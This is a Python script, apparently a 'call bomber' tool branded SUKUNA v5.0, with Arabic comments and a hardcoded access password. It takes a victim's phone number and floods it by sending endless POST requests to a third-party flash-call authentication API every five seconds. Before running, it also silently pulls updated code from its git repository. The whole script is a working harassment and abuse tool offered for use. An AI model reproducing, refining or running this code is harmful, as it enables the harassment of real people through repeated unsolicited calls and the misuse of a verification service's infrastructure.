import aiohttp, asyncio, json, sys, os, subprocess

# الألوان
G, R, Y, C, W = '\033[1;32m', '\033[1;31m', '\033[1;33m', '\033[1;36m', '\033[1;37m'

# --- 1. ميزة التحديث التلقائي (Auto Update) ---
def check_for_updates():
    try:
        # يقوم بسحب التحديثات من GitHub قبل تشغيل الأداة
        print(f"{C}[*] Checking for updates from SUKUNA-Cloud...")
        subprocess.run(["git", "pull"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        pass

# --- 2. ميزة حلقة كلمة السر (Password Loop) ---
def check_password():
    while True:
        pwd = input(f"{Y}[?] Enter Password: {W}")
        if pwd == "1121":
            print(f"{G}[+] Access Granted! Welcome Ali.")
            break
        else:
            print(f"{R}[!] Wrong Password! Try again.")

def banner():
    os.system('clear')
    print(f"""{R}
  ____  _   _ _  ___   _ _   _    _     
 / ___|| | | | |/ / | | | \ | |  / \    
 \___ \| | | | ' /| | | |  \| | / _ \   
  ___) | |_| | . \| |_| | |\  |/ ___ \  
 |____/ \___/|_|\_\\___/|_| \_/_/   \_\ {Y}v5.0
    {G}King: Ali Talib (SUKUNA) | {C}Auto-Update: ON
    -------------------------------------------""")

async def call_attack(phone):
    ok, bad = 0, 0
    headers = {'User-Agent': "okxgvhttp/4.12.0", 'Content-Type': "application/json"}
    async with aiohttp.ClientSession() as session:
        while True:
            try:
                async with session.post(
                    "https://31.171.171.90/api/phone-numbers/auth-flash-call",
                    data=json.dumps({"phoneNumber": phone}),
                    headers=headers, timeout=10
                ) as resp:
                    if resp.status == 200: ok += 1
                    else: bad += 1
            except: bad += 1
            sys.stdout.write(f"\r{G}[+] Success: {ok} {R}[-] Failed: {bad} {Y} | Target: {phone}")
            sys.stdout.flush()
            await asyncio.sleep(5)

def main():
    check_for_updates() # فحص التحديثات أولاً
    banner()
    check_password() # طلب كلمة السر حتى يتم إدخالها صح
    
    target = input(f"\n{Y}[+] Enter Phone (+967...): {G}")
    print(f"{G}[*] Launching Attack... (Ctrl+C to stop)")
    try:
        asyncio.run(call_attack(target))
    except KeyboardInterrupt:
        print(f"\n{R}[!] Stopped.")

if __name__ == "__main__":
    main()
